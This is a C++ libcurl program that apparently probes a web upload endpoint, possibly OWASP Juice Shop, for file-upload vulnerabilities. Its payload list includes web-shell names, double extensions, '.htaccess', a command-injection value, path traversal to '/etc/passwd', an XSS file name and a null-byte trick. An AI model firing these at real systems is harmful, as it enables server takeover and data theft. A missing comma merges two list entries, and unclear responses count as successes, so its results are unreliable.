#include <iostream>
#include <string>
#include <vector>
#include <algorithm>        // std::transform
#include <curl/curl.h>

/* ------------------------------------------------------------ */
/*           Helpers                                            */
/* ------------------------------------------------------------ */
static size_t WriteCallback(void* contents, size_t size,
                            size_t nmemb, std::string* responseBody)
{
    size_t total = size * nmemb;
    responseBody->append(static_cast<char*>(contents), total);
    return total;
}

/* Very small “parser” – no external JSON lib required
   Returns true  → server rejected the upload
           false → server accepted the upload                  */
static bool isBlocked(const std::string& body)
{
    // lower-case copy for case-insensitive search
    std::string b = body;
    std::transform(b.begin(), b.end(), b.begin(),
                   [](unsigned char c){ return std::tolower(c); });

    /* Success markers used by many back ends (e.g. Juice Shop) */
    if (b.find("\"status\"") != std::string::npos &&
        b.find("success")    != std::string::npos)
        return false;

    /* Common rejection words */
    static const std::vector<std::string> badWords = {
        "\"error\"",   "not allowed", "blocked",
        "invalid",     "forbidden",   "only"
    };

    for (auto const& w : badWords)
        if (b.find(w) != std::string::npos)
            return true;

    /* Fallback: if the body is empty we cannot decide, so assume success */
    return false;
}

/* ------------------------------------------------------------ */
void upload_file(const std::string& url)
{
    const std::vector<std::string> payloads = {
        "legal.pdf",
        "test.exe",
        "shell.php",
        "profile.jpg.php",
        ".htaccess",
        ";sleep$IFS$()10",
        "../../etc/passwd",
        "<script>alert('xss')</script>.png",
        "test.html",
        "large_file.bin",
        "null_byte.png%00.php"
        "avatar.jpg",
        "sample.png",
        "banner.gif"

    };

    std::cout << "\n= Начинаем тестирование на уязвимости загрузки файлов =\n\n";

    for (const std::string& fileName : payloads) {

        std::cout << "Попытка загрузки: " << fileName << '\n';

        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "  [ERROR] libcurl init failed\n";
            return;
        }

        const std::string filePath = "../payloads/" + fileName;

        curl_mime* mime     = curl_mime_init(curl);
        curl_mimepart* part = curl_mime_addpart(mime);
        curl_mime_name(part, "file");
        curl_mime_filedata(part, filePath.c_str());

        std::string responseBody;
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseBody);

        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        CURLcode res = curl_easy_perform(curl);

        long status = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);

        if (res != CURLE_OK) {
            std::cerr << "  [ERROR] " << curl_easy_strerror(res) << '\n';
        } else {
            bool blocked = isBlocked(responseBody);

            std::cout << "  Статус: " << status << " | "
                      << (blocked ? "[INFO] File blocked"
                                  : "[OK]   Uploaded successfully")
                      << '\n';
        }

        curl_mime_free(mime);
        curl_easy_cleanup(curl);
    }
}